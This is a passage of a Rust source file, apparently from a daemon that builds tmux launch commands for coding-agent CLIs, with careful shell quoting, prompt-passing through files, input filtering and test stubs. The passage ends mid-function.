//! Domain services: the operations a client can invoke.
//!
//! Every read that reports terminal or workspace state DERIVES it from durable
//! intent joined against the live tmux inventory. Nothing here ever reads a
//! stored runtime state, because none exists.

use std::path::{Path, PathBuf};
use std::sync::Arc;

use farcooler_core::{
    DomainError, Result,
    derive::{self, DerivedTerminal},
    inventory::RuntimeInventory,
    names, validate,
};
use farcooler_protocol::v1::{TerminalIntent, TerminalState, WorkspaceState};
use farcooler_store::{Store, models};
use farcooler_tmux::{LiveInventory, TmuxServer};
use uuid::Uuid;

use crate::runtime::Runtime;
use crate::{agent_supervisor, foreground, git, hook_ingress, paths, session_discovery};

/// Launch presets. Coding agents run through the user's configured shell so
/// startup files, version managers, direnv, and aliases behave like a
/// hand-launched terminal. The default mode is an interactive login shell.
/// Build the command for a preset.
///
/// A preset may carry a model after a colon — `claude:opus`. Encoded in the
/// preset rather than added as a second field because it travels through the
/// protocol, the CLI, the store and three clients as one string, and every one
/// of those would otherwise need a parallel parameter that is almost always
/// empty.
///
/// The model is validated before it reaches a shell. It is the only part of
/// this that a client supplies freely, and it ends up inside a `-ilc` string.
///
/// `session_id`, when given to a `claude` preset, is declared to the process
/// with `--session-id` rather than left to be discovered later from whichever
/// `.jsonl` file under `~/.claude/projects` turns out to be newest. Only
/// `claude` understands the flag, so every other preset ignores it.
/// The binary that hosts `agent-host`, next to the daemon that is asking.
///
/// NOT `current_exe()`. The daemon is `farcoolerd` and `agent-host` is a
/// subcommand of the `farcooler` CLI — two binaries from one workspace. Using
/// the daemon's own path put `farcoolerd agent-host …` into the pane, where
/// `farcoolerd` ignored the arguments, saw a daemon already listening, and
/// exited 0. The pane then died instantly and the terminal derived as an exit
/// the user never caused, which is the most confusing possible failure: agent
/// mode reported success and left nothing behind.
///
/// A sibling of the daemon rather than whatever is on `PATH`, so a daemon built
/// from this workspace runs the CLI built from this workspace. `PATH` is the
/// fallback for an install that separates them.
///
/// By candidate name, because the CLI beside a preview daemon in
/// `~/.local/bin` is `farcooler-preview` and the bare `farcooler` there is the
/// release install. Putting that one into the pane would run an agent against
/// a different channel's daemon — a pane belonging to one fleet, talking to
/// another's — and the bare name is still accepted second so that a cargo
/// target directory, which renames nothing, keeps working.
pub fn shim_binary(daemon_exe: Option<&std::path::Path>) -> String {
    let candidates = farcooler_protocol::CHANNEL.cli_binary_candidates();
    daemon_exe
        .and_then(|p| p.parent())
        .and_then(|dir| candidates.iter().map(|name| dir.join(name)).find(|p| p.exists()))
        .map(|p| p.display().to_string())
        .unwrap_or_else(|| farcooler_protocol::CHANNEL.cli_binary_name().to_string())
}

/// Wrap a value so a shell treats it as exactly one word.
///
/// Single quotes, because inside them a shell interprets nothing at all — no
/// variable expansion, no globbing, no command substitution. A single quote
/// itself is closed, escaped and reopened; so is a backslash, for fish (below).
///
/// This exists for paths that Far Cooler did not choose: a worktree under
/// `~/My Projects` splits into two arguments unquoted, which takes agent mode
/// down entirely for anyone whose directories have spaces in them.
///
/// **A backslash is taken out of the quotes too**, and that is for fish. A
/// pane's command is parsed by the user's login shell (tmux's `default-shell`
/// is pinned to it, and the payload goes to `<login shell> -ilc`), and fish
/// is the one shell here whose single quotes are not inert: inside them `\\`
/// is one backslash and `\'` is a quote. So `'a\\b'` reads as `a\b` to fish
/// and `a\\b` to sh, and a backslash before a closing quote ends nothing in
/// sh but escapes the quote in fish. Written OUTSIDE the quotes as `\\`, a
/// backslash is one backslash to every shell there is, which is what makes
/// this one function right under both. It mattered little while the only
/// things quoted were paths; a prompt somebody typed can hold anything.
pub fn shell_quote(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('\'');
    for c in value.chars() {
        match c {
            '\'' => out.push_str(r"'\''"),
            '\\' => out.push_str(r"'\\'"),
            c => out.push(c),
        }
    }
    out.push('\'');
    out
}

/// The preset whose pane is this worktree's diff.
///
/// A word rather than a flag on `terminal create`, because a preset is already
/// the answer to "what is this pane for" and every path that opens a pane — the
/// CLI's `layout split --preset`, a drop on an edge, the app's own button —
/// carries one. Nothing new had to learn about changes panes to be able to make
/// one.
pub const CHANGES_PRESET: &str = "changes";

/// The process a Changes pane runs.
///
/// tmux has no concept of a pane without one, so a surface the client draws
/// still needs something to own the rectangle. This is that something and it
/// does nothing else: it prints a line saying what the pane is and waits to be
/// killed.
///
/// A subcommand of the CLI rather than `sleep infinity` for the reason
/// `agent-host` is one: the pane's command is read back by the daemon, printed
/// by `terminal list` and shown on a phone, and `sleep` in all three of those
/// places says nothing about what the pane is.
fn changes_host_command() -> String {
    let binary = shim_binary(std::env::current_exe().ok().as_deref());
    format!("{} pane-host --kind changes", shell_quote(&binary))
}

/// What Far Cooler hands a claude pane beyond its preset: both are files in
/// this daemon's runtime directory. `--settings` is claude's alone;
/// `--plugin-dir` is claude's and cursor's.
///
/// - `settings` is `--settings <file>`, the hooks that make the pane report
///   itself (`write_claude_hook_settings`).
/// - `plugin_dir` is `--plugin-dir <dir>`, the plugin that carries the manager
///   skill (`write_plugin`), invoked as `/farcooler:manager` in claude and
///   `/manager` in cursor.
///
/// One struct rather than a parameter each, because every launch path gets
/// both from one call to `Service::prepare_launch_hooks` and hands both to
/// the same builders; a second parameter threaded beside the first is a
/// second thing each of the four launch paths could forget.
///
/// Two more that are not files:
///
/// - `trust_workspace` is cursor's `--trust`, set by `prepare_launch_hooks`
///   for a worktree this runner made itself (`Service::made_this_worktree`).
///   cursor trusts per directory, and every new worktree is a new directory,
///   so without it every task started on a worktree Far Cooler had just made
///   sat on "Trust this workspace?" until someone answered it. It is on every
///   launch in such a worktree, restarts included: a restarted pane that
///   asked again would be the same gate one click later.
/// - `prompt` is the agent's first message, as its launch argument. **Set by
///   `create_terminal_with_prompt` and nowhere else**, which is how "first
///   launch only" is kept: every other launch path builds its extras from
///   `prepare_launch_hooks`, which never sets it, so a restart, a split or a
///   pane coming back from chat cannot send the task a second time.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct LaunchExtras {
    pub settings: Option<PathBuf>,
    pub plugin_dir: Option<PathBuf>,
    pub trust_workspace: bool,
    pub prompt: Option<LaunchPrompt>,
}

/// An agent's first message, and how it reaches the agent's argv.
///
/// Two forms because tmux has a ceiling. The whole `new-window` command,
/// every argument of it, travels from the tmux client to the server as one
/// message, and a message is capped: measured on tmux 3.7c, a 16 300-byte
/// command is accepted and a 17 000-byte one is refused with "command too
/// long". A prompt is quoted twice on its way in, and a pasted stack trace is
/// easily past that. So a long one goes into a file instead, and the command
/// carries the file's name (`MAX_INLINE_LAUNCH_BYTES`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum LaunchPrompt {
    /// The text itself, `shell_quote`d into the command.
    Inline(String),
    /// A file in the runtime directory holding the text. The launch reads it
    /// with `"$(cat …)"` and removes it; see `prompt_argument`.
    File(PathBuf),
}

impl LaunchExtras {
    /// An ordinary launch: nothing handed over.
    pub const NONE: LaunchExtras =
        LaunchExtras { settings: None, plugin_dir: None, trust_workspace: false, prompt: None };

    #[cfg(test)]
    fn settings_only(path: &Path) -> Self {
        Self { settings: Some(path.to_path_buf()), ..Self::NONE }
    }
}

/// The largest launch command that carries its prompt inline. Past this the
/// prompt goes through a file (`LaunchPrompt::File`).
///
/// Half of tmux's measured ceiling (see `LaunchPrompt`), because the command
/// is not all tmux is sent: the window's title, the worktree path and the
/// format string share the same message.
pub const MAX_INLINE_LAUNCH_BYTES: usize = 8 * 1024;

/// The prompt as the last word of an agent's `-ilc` payload, or nothing.
///
/// Inline, it is one `shell_quote`d word — which also puts it in argv, where
/// `ps` and tmux's `pane_start_command` show it to anyone who can read this
/// user's processes. On a Mac that is this user; on a shared Linux runner,
/// `ps` shows argv to every account. The file form is private at rest (0600)
/// but ends up in argv the same way, because an argument is what these CLIs
/// take. A prompt should hold nothing its author would not type into a
/// terminal on that runner.
///
/// From a file it is `"$(cat <file> && rm -f <file>)"`: one word in every
/// shell this runs under (POSIX shells and fish 3.4 or later both keep a
/// double-quoted command substitution whole, newlines included). **Removing
/// the file there is safe**: the substitution has read the whole of it
/// before the agent is exec'd, and the agent is handed the text, never the
/// path, so nothing ever reads the file after that line. Both forms trim
/// nothing but the trailing newlines command substitution always drops.
///
/// The text goes through `guarded` first; see there.
fn prompt_argument(prompt: Option<&LaunchPrompt>) -> String {
    match prompt {
        None => String::new(),
        Some(LaunchPrompt::Inline(text)) => format!(" {}", shell_quote(&guarded(text))),
        Some(LaunchPrompt::File(path)) => {
            let path = shell_quote(&path.display().to_string());
            format!(" \"$(cat {path} && rm -f {path})\"")
        }
    }
}

/// `text`, with a space in front when an argument parser could read it as
/// something other than a prompt.
///
/// Two ways it could. A leading `-` is a flag: "--help me" prints help and
/// "-p fix it" runs claude in print mode. And a first positional that is
/// exactly a subcommand's name runs that subcommand: "update" updates claude
/// or codex, "logout" signs cursor out, "apply" has codex `git apply` its last
/// diff into the tree (each listed in its own `--help`).
///
/// A space in front, rather than `--`. None of the three documents `--` in
/// `--help`, and commander (claude, cursor) still matches the first operand
/// against its commands after one. Both parsers compare a subcommand by
/// exact equality and a flag by its leading `-`; a word that begins with a
/// space is neither, under any parser, and an agent reading the message does
/// not see it. Only a prompt that could collide is touched: one with no
/// whitespace in it at all (a subcommand name has none), or one starting with
/// a dash. "update the readme" is already not a subcommand's name.
fn guarded(text: &str) -> std::borrow::Cow<'_, str> {
    let collides = text.starts_with('-') || !text.contains(char::is_whitespace);
    if collides { format!(" {text}").into() } else { text.into() }
}

/// codex's startup update check, off. See the `"codex"` arm of
/// `preset_command_with_hooks`; a resumed codex gets it too, because the
/// offer is made on every start.
const CODEX_NO_UPDATE_CHECK: &str = "-c check_for_update_on_startup=false";

/// `--settings <file>` and `--plugin-dir <dir>`, each present only when there
/// is a file to name, each path `shell_quote`d. Both of claude's arms (a fresh
/// launch and a resume) build their tail here, so the two can't drift apart.
fn claude_extra_flags(extras: &LaunchExtras) -> String {
    let flag = |name: &str, path: &Option<PathBuf>| {
        path.as_deref()
            .map(|p| format!(" {name} {}", shell_quote(&p.display().to_string())))
            .unwrap_or_default()
    };
    format!("{}{}", flag("--settings", &extras.settings), flag("--plugin-dir", &extras.plugin_dir))
}

/// The same launch, plus the settings file that makes the pane report itself.
///
/// `extras.settings` is the file `hook_install::claude_settings` produced,
/// written into this daemon's runtime directory by `write_claude_hook_settings`
/// and handed to claude as `--settings <file>`. It is claude's arm and nobody
/// else's: codex and cursor have no equivalent flag and read the project-local
/// `.codex/hooks.json` and `.cursor/hooks.json` that `install_project_hooks`
/// merges into a worktree instead.
///
/// `LaunchExtras::NONE` is an ordinary launch and produces, byte for byte,
/// the command this function produced before hooks existed.
///
/// **The only entry point, deliberately.** There was a two-argument
/// `preset_command` beside this one, a thin delegate passing `None` — and once
/// the four launch sites moved here it had no production caller left, only a
/// shorter and more obvious name for the next person to reach for. This branch
/// fixed "a launch path that reports nothing" twice already, at
/// `split_terminal` and at `restart_terminal`; leaving a hookless builder in
/// scope was leaving that trap set for a third time. Its tests call this now.
pub fn preset_command_with_hooks(
    preset: &str,
    session_id: Option<&str>,
    extras: &LaunchExtras,
) -> String {
    let shell = farcooler_core::shell::login_shell();
    let (agent, model) = match preset.split_once(':') {
        Some((a, m)) if is_safe_model(m) => (a, Some(m)),
        // A model that is not a plain identifier is dropped, not escaped and
        // not passed on. Nothing legitimate is lost and there is no argument
        // about quoting.
        Some((a, _)) => (a, None),
        None => (preset, None),
    };

    let flag = model.map(|m| format!(" --model {m}")).unwrap_or_default();

    // Declared, not discovered — but it still ends up inside a `-ilc` string,
    // so anything that is not a plain uuid is dropped rather than escaped. The
    // cost of dropping it is one adoption that has to fall back to searching.
    let session = session_id
        .filter(|s| Uuid::parse_str(s).is_ok())
        .map(|s| format!(" --session-id {s}"))
        .unwrap_or_default();

    // The one interpolation in this function whose text Far Cooler did not
    // choose the shape of. A model and a session id are both filtered down to
    // a plain identifier above; this is a real path on a real disk, and on
    // macOS the runtime directory it lives in is under `Application Support`
    // — a space, in the default install, for every user.
    let settings = claude_extra_flags(extras);

    // The first message, for the three agents that take one as an argument.
    // Empty on every launch but a terminal's first (see `LaunchExtras`).
    let prompt = prompt_argument(extras.prompt.as_ref());

    match agent {
        "shell" => format!("{shell} -il"),
        // Before the shell branches below, and deliberately not through one: a
        // login shell would put a `.zshrc` between tmux and the process, and
        // the one thing this pane has to do is exist for as long as tmux says
        // it does.
        CHANGES_PRESET => changes_host_command(),
        // `shell_quote` around the whole payload rather than the bare `'…'`
        // every other arm writes, because this is the only arm that can carry
        // a quote of its own: `settings` is `shell_quote`d in turn, and a
        // single-quoted path nested inside a single-quoted `-ilc` argument
        // ends the outer quote and splits the command in half. The two layers
        // are real — tmux hands this string to `sh -c`, which hands the `-ilc`
        // argument to the login shell — and `shell_quote` is what survives
        // both. With no settings file the payload holds no quote at all, so
        // `shell_quote` produces exactly the `'claude…'` this arm has always
        // produced, byte for byte.
        "claude" => {
            format!(
                "{shell} -ilc {}",
                shell_quote(&format!("{}{flag}{session}{settings}{prompt}", agent_program("claude")))
            )
        }
        // `shell_quote` around the payload now, for claude's reason: the
        // prompt is quoted in turn. With no prompt the payload holds no quote.
        //
        // `check_for_update_on_startup=false` because codex's update offer is
        // a numbered menu that waits for Enter, and in a pane nobody is
        // watching yet that is a task that never starts. Per launch rather
        // than in `~/.codex/config.toml`, which is the person's own file.
        // The key was checked against the installed codex: it is a field of
        // codex's config (a wrong type there fails `codex doctor`'s config
        // load, where an unknown key is ignored).
        "codex" => format!(
            "{shell} -ilc {}",
            shell_quote(&format!("{}{flag} {CODEX_NO_UPDATE_CHECK}{prompt}", agent_program("codex")))
        ),
        // `shell_quote` around the payload for claude's reason: the plugin
        // path is quoted in turn. With no plugin directory, no trust and no
        // prompt the payload holds no quote, and this is the
        // `'cursor-agent…'` it always was.
        "cursor" => {
            let plugin = extras
                .plugin_dir
                .as_deref()
                .map(|p| format!(" --plugin-dir {}", shell_quote(&p.display().to_string())))
                .unwrap_or_default();
            let trust = if extras.trust_workspace { " --trust" } else { "" };
            format!(
                "{shell} -ilc {}",
                shell_quote(&format!("{}{flag}{trust}{plugin}{prompt}", agent_program("cursor-agent")))
            )
        }
        other if is_safe_model(other) => format!("{shell} -ilc '{}{flag}'", agent_program(other)),
        // An unrecognized preset that is not a plain identifier is not run at
        // all. A preset is chosen from a list; anything else is a bug or an
        // attempt.
        _ => format!("{shell} -il"),
    }
}

/// The program an agent launch runs: `name` itself, always, outside tests.
///
/// **Under test, a stub by default.** Every launch builder -- the three
/// agent arms of `preset_command_with_hooks` and its `other` arm, the two
/// resume commands in `terminal_mode_command`, and the `agent-host` shim in
/// `set_pane_mode` -- names its program through this, so a daemon unit test
/// that opens a real pane in a private tmux server starts
/// `test_agent::PROGRAM` there, with `name` and everything after it as
/// arguments that nothing reads. That matters for any launch, and most for
/// a pane opened for a task: its first message tells the agent to run board
/// commands through a CLI that, from a test binary, reaches whichever daemon
/// is on this machine.
///
/// A test that checks the command a builder writes, rather than running it,
/// takes `test_agent::real_names()` and sees the real program; the tmux
/// boundary refuses to launch anything built under that guard
/// (`test_agent::refuse_a_real_agent`).
fn agent_program(name: &str) -> String {
    #[cfg(test)]
    if !test_agent::REAL.with(|r| r.get()) {
        return format!("{} {name}", test_agent::PROGRAM);
    }
    name.to_string()
}

#[cfg(test)]
pub(crate) mod test_agent {
    use std::cell::Cell;

    /// The name the stub runs under, so a test can find it in a pane's
    /// start command. It is only ever `$0` of the `sh` below, never looked up
    /// as a program.
    pub(crate) const MARKER: &str = "farcooler-test-stub-agent";

    /// What an agent's launch runs in place of the agent: a `sh` that waits,
    /// named `MARKER`, which takes the agent's own name and every argument
    /// after it -- flags, session id, the opening prompt -- as positional
    /// parameters and reads none of them. The `exec` means the only process
    /// left in the pane is `/bin/sleep`.
    ///
    /// **It waits, rather than failing at once.** The first stub was a name
    /// no binary has, so the login shell printed "unknown command" and
    /// exited, and `remain-on-exit` kept a dead pane. A test that then acted
    /// on the pane -- `set_pane_mode` needs one that `proves_life` -- raced
    /// the shell's exit: on a fast CI runner the shell won, and
    /// `a_pane_opened_for_a_task_names_it_after_switching_modes` failed with
    /// `NotFound`. Ten minutes bounds the stub if a tmux server were ever left
    /// behind; `ScratchDir` kills the server, and the stub with it, when the
    /// test ends.
    ///
    /// Written with `\ ` rather than quotes so it survives the arms'
    /// `shell_quote` and every login shell's own parse the same way.
    pub(crate) const PROGRAM: &str = "/bin/sh -c exec\\ /bin/sleep\\ 600 farcooler-test-stub-agent";

    /// The programs the refusal below looks for: the four agents
    /// `farcooler_core`'s registry identifies a pane by (`claude`, `codex`,
    /// `opencode`, `cursor-agent`) and the shim. One of these reaching tmux
    /// without the stub earlier in the same command is a real agent about to
    /// start.
    const AGENTS: [&str; 5] = ["claude", "codex", "opencode", "cursor-agent", "agent-host"];

    thread_local! {
        pub(crate) static REAL: Cell<bool> = const { Cell::new(false) };
    }

    /// Build real program names on this thread until the guard drops -- for
    /// a test that checks the string a builder writes and launches nothing.
    /// Anything built under it that reaches tmux panics instead of starting.
    ///
    /// A thread-local, so it cannot leak into a test on another thread; a
    /// builder that runs on some other thread than the test's gets the stub,
    /// which is the safe direction.
    pub(crate) fn real_names() -> Guard {
        REAL.with(|r| r.set(true));
        Guard
    }

    pub(crate) struct Guard;

    impl Drop for Guard {
        fn drop(&mut self) {
            REAL.with(|r| r.set(false));
        }
    }

    /// `command` with the stub taken back out, so a test that reads a
    /// stubbed launch's argv through a shell (swapping the agent for a
    /// `printf`) runs the `printf` and not the stub's `sleep`. Removes both
    /// renderings the builders write: bare, and inside `shell_quote`.
    pub(crate) fn unstubbed(command: &str) -> String {
        let quoted = super::shell_quote(PROGRAM);
        let inner = &quoted[1..quoted.len() - 1];
        command.replace(&format!("{inner} "), "").replace(&format!("{PROGRAM} "), "")
    }

    /// The tmux boundary's check, run on every command a test is about to
    /// hand tmux: panics rather than start a real agent. Two ways in, both
    /// refused -- a command built under `real_names()`, and an agent's
    /// program with no stub earlier in the same command, which is what a new
    /// launch path that forgot `agent_program` would write.
    ///
    /// Words are split on whitespace, quotes and the shell's own
    /// punctuation, and compared by basename, so `/opt/homebrew/bin/claude`,
    /// `claude;` and `$(command -v claude)` are all `claude`. The first agent
    /// in each command -- the text between two of the shell's separators --
    /// needs the stub before it in that same command. Everything after it
    /// there is the stub's arguments (`--preset claude`, a prompt that names
    /// an agent) and is not checked. A separator ends what a stub vouches
    /// for, so a stubbed launch followed by `; codex` is refused. Separators
    /// are found without regard to quoting, so a prompt holding one and then
    /// an agent's name (`'fix it; ask codex'`) is refused too -- the safe
    /// direction, and no test's prompt does.
    ///
    /// **What it still cannot see:** a program named through a variable, an
    /// alias, `eval` or a wrapper script; and any agent not in `AGENTS`. It
    /// is the backstop. `agent_program` stubbing every launch builder is the
    /// protection.
    pub(crate) fn refuse_a_real_agent(command: &str) {
        assert!(
            !REAL.with(|r| r.get()),
            "a test built this command with test_agent::real_names() and then launched it; \
             real names are for checking a builder's string, never for a pane: {command}"
        );
        // One command at a time: a separator ends what a stub in front of it
        // can vouch for.
        for segment in command.split(|c: char| ";&|()<>$`\n".contains(c)) {
            let words: Vec<&str> = segment
                .split(|c: char| c.is_whitespace() || c == '\'' || c == '"')
                .filter(|w| !w.is_empty())
                .collect();
            for (i, word) in words.iter().enumerate() {
                let program = word.rsplit('/').next().unwrap_or(word);
                if !AGENTS.contains(&program) {
                    continue;
                }
                assert!(
                    words[..i].contains(&MARKER),
                    "a daemon unit test was about to start a real `{program}` in a tmux pane. Every launch \
                     names its program through `agent_program`, which stubs it under test; this one did \
                     not: {command}"
                );
                // Everything after a stubbed agent in this command is its
                // arguments -- `--preset claude`, a prompt that names an
                // agent -- which the stub never reads.
                break;
            }
        }
    }
}

/// Whether a pane running `preset` is an agent this runner dispatched.
///
/// **Three ways to not be one, and everything else is.** `shell` is a
/// person's own prompt and `changes` is a rectangle holding a diff — nobody
/// dispatched either to work a ticket, and a person typing
/// `farcooler task note` into their own shell is a person. The third is the
/// one that is easy to miss: a preset that is not a plain identifier reaches
/// `preset_command_with_hooks`'s final arm and is NOT RUN — that pane gets
/// `{shell} -il`, a login shell, exactly like `shell` does. Left out, a
/// preset with a space in it would have put a person at a prompt and told the
/// board an agent was typing, which is item 1's own failure with the two
/// names swapped.
///
/// Stated as what is not an agent rather than as a list of what is, because a
/// preset from a user-configured adapter is a name this build cannot
/// enumerate and has to be named correctly the day it arrives.
///
/// **This function and `preset_command_with_hooks` have to agree**, and the
/// agreement is the thing worth checking rather than either half: true here
/// must mean that builder launched a named program, false must mean it
/// launched this person's shell or the changes host. `is_safe_model` is the
/// same gate its `other if …` arm uses, and the head split is the same split,
/// so `claude:opus` is `claude` on both sides. See
/// `a_pane_is_named_an_agent_exactly_when_one_was_launched_in_it`.
fn preset_runs_an_agent(preset: &str) -> bool {
    let head = preset.split_once(':').map(|(a, _)| a).unwrap_or(preset);
    head != "shell" && head != CHANGES_PRESET && is_safe_model(head)
}

/// The launch, plus the name the pane files its board writes under.
///
/// `FARCOOLER_ACTOR=agent:<terminal id>`, which is exactly what
/// `farcooler_store::models::Actor` parses back. Until this existed, every
/// board write an agent made arrived with no actor named and the runner read
/// that as `user` — so the actor field the whole `task_changed` event is built
/// around said "a person" for every agent on the runner, and nothing anywhere
/// said otherwise. See `farcooler_core::pane_env` for the other end.
///
/// `env` rather than a bare `NAME=value` prefix. tmux hands a one-argument
/// command to the pane's `default-shell`, which `TmuxServer`'s managed config
/// pins to whatever the user's login shell happens to be — so the prefix form
/// would make this line depend on a SHELL feature rather than on a program.
/// Every POSIX shell has it and fish has had it since 3.1, but fish before
/// that did not, and neither this function nor `login_shell()` knows which
/// shell or which version it is about to be parsed by. `env` is a binary and
/// runs the same way under all of them.
///
/// It `exec`s its target — measured, not assumed: the child of a pane started
/// this way reports the target's own name, so `pane_current_command`, which is
/// what `Registry::rules_for_command` identifies an agent from, reads exactly
/// what it read before this existed.
///
/// Nothing is quoted because nothing here needs it: a uuid is thirty-six
/// characters of hex and dashes, and `command` was already built to be handed
/// to a shell.
///
/// **`FARCOOLER_TASK` beside it, when the terminal was opened for a task**
/// (`terminals.task_id`, written by `task dispatch` through `terminal.create`).
/// Every launch path passes the key it reads off the record, so a restart or a
/// pane coming back from chat names the same task the first launch did. With
/// no task on the record there is no honest answer, so nothing is exported:
/// a guessed key files an agent's notes on somebody else's ticket. A key that
/// is not a plain identifier (`pane_task_key`) is dropped rather than quoted.
fn with_pane_env(terminal: Uuid, preset: &str, task_key: Option<&str>, command: String) -> String {
    if !preset_runs_an_agent(preset) {
        return command;
    }
    let task = task_key
        .filter(|k| is_safe_model(k))
        .map(|k| format!(" {}={k}", farcooler_core::pane_env::TASK))
        .unwrap_or_default();
    format!("env {}=agent:{terminal}{task} {command}", farcooler_core::pane_env::ACTOR)
}

/// The first message of a pane opened for a task: where the brief is, and
/// nothing else.
///
/// It carries no free text. The task on the board is the brief, and this
/// says to read it, so the board stays the only place the work is described
/// and a revised task is read fresh rather than replayed from a launch
/// argument. It goes through the same first-launch path as any prompt
/// (`launch_command_with_prompt`), so it is sent once: a restart exports the
/// key again and says nothing.
///
/// `cli` is `shim_binary`'s path, `shell_quote`d, as the manager skill gets
/// it: a bare `farcooler` on `PATH` can be another channel's CLI talking to
/// another daemon.
///
/// A key from a repository that missed its prefix (`-1`) would read as a
/// flag in a command, so the commands leave it out and let the pane's
/// `FARCOOLER_TASK` name the task, which it does for every key this is
/// given.
fn opening_prompt(cli: &str, key: &str) -> String {
    let arg = if key.starts_with('-') { String::new() } else { format!(" {key}") };
    format!(
        "You're working {key} on this repository's Far Cooler board. Read the task first: \
         {cli} task show{arg}. If the main checkout has a .farcooler/manager.md, it's the \
         owner's charter; follow it. Work to the task's acceptance items. Record each decision \
         as you make it with {cli} task note{arg} --kind decision --body \"<what, and why>\". \
         If only the owner can decide something, ask with {cli} task ask{arg} --body \
         \"<the question>\" and stop. When you're done, move the task the way the charter says."
    )
}

/// Where this daemon keeps the settings file it hands claude.
///
/// One file per runner, in the runtime directory, beside the socket it names.
/// Not one per terminal: `claude_settings` is a pure function of the hook
/// socket and the socket is per daemon, so every terminal on this runner would
/// otherwise get an identical copy under a different name.
///
/// Far Cooler's own file, in Far Cooler's own directory — which is the whole
/// point of `--settings`. No file claude reads by itself is touched, so a
/// person's `~/.claude/settings.json` is exactly as it was whether Far Cooler
/// is installed or not.
fn claude_hook_settings_path(runtime_dir: &Path) -> PathBuf {
    runtime_dir.join("claude-hooks.json")
}

/// Write that file, and say where it went.
///
/// `None` on any failure, and the caller launches the pane anyway. A runner
/// that cannot write its own runtime directory has a larger problem than a
/// silent agent, and refusing to open a terminal over it would turn a missing
/// live view into a feature that will not start.
fn write_claude_hook_settings(runtime_dir: &Path) -> Option<PathBuf> {
    let socket = hook_ingress::HookIngress::socket_path(runtime_dir);
    let settings = crate::hook_install::claude_settings(&socket);
    let text = serde_json::to_string_pretty(&settings).ok()?;
    let path = claude_hook_settings_path(runtime_dir);
    match std::fs::write(&path, text) {
        Ok(()) => Some(path),
        Err(e) => {
            tracing::warn!(
                error = %e,
                path = %path.display(),
                "could not write claude's hook settings; this pane reports nothing"
            );
            None
        }
    }
}

/// Write the plugin that carries the manager skill into the runtime directory,
/// and say where it went. claude and cursor are both handed it.
///
/// `--plugin-dir` loads it for that session only (measured in both: claude
/// answered `/farcooler:manager`, cursor answered `/manager`, and neither
/// model was offered it on its own), so like
/// `claude-hooks.json` this is Far Cooler's own file in Far Cooler's own
/// directory and nothing of the user's or the repository's is touched.
///
/// Rewritten whenever it differs, with no ownership check: nobody else writes
/// here, and the owner's ruling is that the skill is regenerated on every
/// launch, with customization living in the charter. A file that already says
/// the same thing is not touched, so every later launch costs a read.
///
/// `None` on any failure, and the pane launches anyway, as it does without
/// its hooks: a manager that can't be summoned is not worth a terminal that
/// won't open.
fn write_plugin(runtime_dir: &Path) -> Option<PathBuf> {
    use crate::skill_install::{Harness, PLUGIN_DIR, render, write_atomically};
    let dir = runtime_dir.join(PLUGIN_DIR);
    let cli = shell_quote(&shim_binary(std::env::current_exe().ok().as_deref()));
    for file in render(Harness::Claude, &cli) {
        let path = dir.join(file.relative);
        if std::fs::read(&path).is_ok_and(|now| now == file.contents.as_bytes()) {
            continue;
        }
        if let Err(e) = write_atomically(&path, &file.contents) {
            tracing::warn!(
                error = %e,
                path = %path.display(),
                "could not write the manager skill; this pane can't be asked to manage"
            );
            return None;
        }
    }
    Some(dir)
}

/// The function that folds our registrations into one agent's hooks file.
///
/// `merge_codex` or `merge_cursor` — one shape, because the difference between
/// the two is the vocabulary inside the document rather than anything the
/// caller has to know about.
type MergeHooks = fn(&str, &Path) -> String;

/// Give a fresh worktree the two project-local hook files codex and cursor
/// read, so a pane launched in it reports itself the way a claude pane does.
///
/// claude is absent here on purpose: it is handed `--settings` at launch
/// (`preset_command_with_hooks`) and has no file of anyone's rewritten at all.
/// The other two have no such flag, so the registration has to live in a file
/// they will find — project-local, in this worktree, rather than in the user's
/// `~/.codex` or `~/.cursor`, so nothing outside a Far Cooler worktree changes
/// behavior.
///
/// Never fails. Writing into a worktree is a side effect on somebody's files
/// and it is not worth a workspace for: a read-only mount, a `.cursor` that is
/// a file rather than a directory, a hooks file we cannot parse — each of
/// those loses the live view for that agent in that worktree and nothing else.
async fn install_project_hooks(worktree: &Path, socket: &Path) {
    // Both paths come off `PROJECT_HOOK_FILES`, which `git::is_dirty` and
    // `change_set::working_tree` also read to subtract untracked copies of
    // these files from what they report. Spelling them out here as well is what would let the
    // installer and those two filters drift apart, and the drift is invisible:
    // a file written under a name nothing filters just quietly becomes the
    // user's uncommitted work.
    use crate::hook_install::{CODEX_HOOKS, CURSOR_HOOKS, merge_codex, merge_cursor};
    install_project_hook_file(worktree, CODEX_HOOKS, socket, merge_codex).await;
    install_project_hook_file(worktree, CURSOR_HOOKS, socket, merge_cursor).await;
    // Not the manager skill. codex's copy is written when a codex pane is
    // opened (`prepare_launch_hooks`), so a worktree only claude or cursor
    // ever runs in never holds a document none of them reads.
}

/// Whether a preset's pane needs the manager skill written into its
/// worktree: codex alone, which has no per-session way to load one. claude
/// and cursor are handed the plugin in the runtime directory instead
/// (`write_plugin`). Matched on the agent exactly, like
/// `project_hook_file_for`.
fn project_skill_for(preset: &str) -> Option<crate::skill_install::Harness> {
    match preset.split_once(':').map_or(preset, |(agent, _)| agent) {
        "codex" => Some(crate::skill_install::Harness::Codex),
        _ => None,
    }
}

/// Whether a preset runs cursor, with or without a model.
fn is_cursor(preset: &str) -> bool {
    preset.split_once(':').map_or(preset, |(agent, _)| agent) == "cursor"
}

/// Whether `preset` launches codex, in any of its model variants.
fn is_codex(preset: &str) -> bool {
    preset.split_once(':').map_or(preset, |(agent, _)| agent) == "codex"
}

/// The largest prompt `terminal.create` accepts: 100 KiB.
///
/// Below Linux's ceiling on ONE argument string, `MAX_ARG_STRLEN`, which is
/// 32 pages — 128 KiB — and applies however the text got there: a prompt past
/// it passes every check here, is written to its file, is read back by the
/// shell and then fails `execve` with E2BIG, and the pane shows "Argument list
/// too long" and exits. Linux runners are supported, so the cap is Linux's,
/// with a margin for the guard's space and for UTF-8 counted in bytes. The
/// Mac checks the same number before it asks (`QuickCreate`).
pub const MAX_LAUNCH_PROMPT_BYTES: usize = 100 * 1024;

/// A prompt that can become a process argument. A NUL cannot: argv strings
/// are NUL-terminated, so the text after it would be cut off without a word.
fn validate_launch_prompt(prompt: &str) -> Result<()> {
    if prompt.len() > MAX_LAUNCH_PROMPT_BYTES {
        return Err(DomainError::InvalidArgument { what: "prompt is too long" });
    }
    if prompt.contains('\0') {
